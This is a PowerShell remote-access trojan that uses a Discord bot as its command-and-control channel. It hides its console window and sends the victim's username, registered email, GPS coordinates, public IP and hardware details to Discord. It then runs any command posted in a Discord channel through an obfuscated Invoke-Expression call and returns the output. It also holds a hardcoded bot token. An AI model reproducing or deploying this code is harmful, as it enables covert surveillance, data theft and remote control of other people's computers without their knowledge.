# =====================================================================================================================================================
<#
**SETUP**
-SETUP THE BOT
1. Make a Discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Read Messages/View Channels, Send Messages
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

**INFORMATION**
- The Discord bot you use must be in one server ONLY
#>
# =====================================================================================================================================================
$global:token = "MTM5NzkxNDM2MTg3MTQ2NjUxNg.GZjxYq.xy5rZvYLs0WM8Hyt1kCYXERkvhCT7XQVUxehfQ"
# =============================================================== SCRIPT SETUP =========================================================================

$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
$spawnChannels = 1 # Create new channel on session start
$InfoOnConnect = 1 # Generate client info message on session start
$defaultstart = 1 # Option to start all jobs automatically upon running

$version = "1.0" # Version number
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy @ HH:mm"

# =============================================================== MODULE FUNCTIONS =========================================================================

# Create a new category for text channels function
Function NewChannelCategory{
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new category is: $($responseObj.id)"
    $global:CategoryID = $responseObj.id
}

# Create a new channel function
Function NewChannel{
    param([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "$name"
        "type" = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

# Send a message or embed to discord channel function
function sendMsg {
    param([string]$Message,[string]$Embed)

    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        $jsonPayload = $null
    }
    if ($Message) {
        $jsonBody = @{
            "content" = "$Message"
            "username" = "$env:computername"
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        $message = $null
    }
}

# Gather System and user information
Function quickInfo{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}  
    if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
    else{
        $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude;$GL = $GL -split " "
        $Lat = $GL[0].Substring(11) -replace ".$";$Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    } else {
        $adminperm = "True"
    }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $script:jsonPayload = @{
        username   = $env:COMPUTERNAME
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | Computer Information "
                "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Options**               : Show The Options Menu
- **SystemInfo**            : Show Detailed System Information
- **Close**                 : Close this session
"@
                color       = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

# Hide powershell console window function
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

Function Options {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Commands List "
            "description" = @"

### SYSTEM COMMANDS
- **SystemInfo**: Show detailed system information
- **IsAdmin**: Check if the session is admin
- **Options**: Show this commands list
- **Close**: Close this session

### POWERSHELL COMMANDS
- You can execute any PowerShell command directly in chat
- Results will be returned to this channel
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function CloseMsg {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = " $env:COMPUTERNAME | Session Closed "
            "description" = @"
:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
"@
            color       = 16711680
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
sendMsg -Embed $jsonPayload
}

# Scriptblock for PS console in discord
$doPowershell = {
    param([string]$token,[string]$PowershellID)
    Function Get-BotUserId {
        $headers = @{
            'Authorization' = "Bot $token"
        }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
        $botInfo = $botInfo | ConvertFrom-Json
        return $botInfo.id
    }
    $global:botId = Get-BotUserId
    sleep 5
    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers.Add("Authorization", "Bot $token")
    function senddir{
        $dir = $PWD.Path
        $w.Headers.Add("Content-Type", "application/json")
        $j = @{"content" = "``PS | $dir >``"} | ConvertTo-Json
        $x = $w.UploadString($url, "POST", $j)
    }
    senddir
    while($true){
        $msg = $w.DownloadString($url)
        $r = ($msg | ConvertFrom-Json)[0]
        if($r.author.id -ne $botId){
            $a = $r.timestamp
            $msg = $r.content
        }
        if($a -ne $p){
            $p = $a
            $out = &($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $()) $msg
            $resultLines = $out -split "`n"
            $currentBatchSize = 0
            $batch = @()
            foreach ($line in $resultLines) {
                $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
                if (($currentBatchSize + $lineSize) -gt 1900) {
                    $w.Headers.Add("Content-Type", "application/json")
                    $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
                    $x = $w.UploadString($url, "POST", $j)
                    sleep 1
                    $currentBatchSize = 0
                    $batch = @()
                }
                $batch += $line
                $currentBatchSize += $lineSize
            }
            if ($batch.Count -gt 0) {
                $w.Headers.Add("Content-Type", "application/json")
                $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
                $x = $w.UploadString($url, "POST", $j)
            }
            senddir
        }
        sleep 3
    }
}

Function ConnectMsg {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    } else {
        $adminperm = "True"
    }

    if ($InfoOnConnect -eq '1'){
        $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
    }
    else{
        $infocall = 'Type `` Options `` in chat for commands list'
    }

    $script:jsonPayload = @{
        username   = $env:COMPUTERNAME
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | C2 session started!"
                "description" = @"
Session Started  : ``$timestamp``

$infocall
"@
                color       = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload

    if ($InfoOnConnect -eq '1'){
        quickInfo
    }
}

# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
# Hide the console
If ($hideconsole -eq 1){ 
    HideWindow
}

Function Get-BotUserId {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
    $botInfo = $botInfo | ConvertFrom-Json
    return $botInfo.id
}
$global:botId = Get-BotUserId

# Create category and new channels
NewChannelCategory
sleep 1
NewChannel -name 'session-control'
$global:SessionID = $ChannelID
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID
sleep 1

# Opening info message
ConnectMsg

# Start PowerShell console upon running the script
If ($defaultstart -eq 1){ 
    Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
}

# Send setup complete message to discord
sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"

# =============================================================== MAIN LOOP =========================================================================

while ($true) {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if ($most_recent_message.author.id -ne $botId) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        
        $PSrunning = Get-Job -Name PSconsole
        
        if ($messages -eq 'psconsole'){
            if (!($PSrunning)){
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'systeminfo'){
            quickInfo
        }
        if ($messages -eq 'options'){
            Options
        }
        if ($messages -eq 'isadmin'){
            if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
                sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
            }
            else{
                sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
            }
        }
        if ($messages -eq 'close'){
            CloseMsg
            sleep 2
            exit      
        }
    }
    Sleep 3
}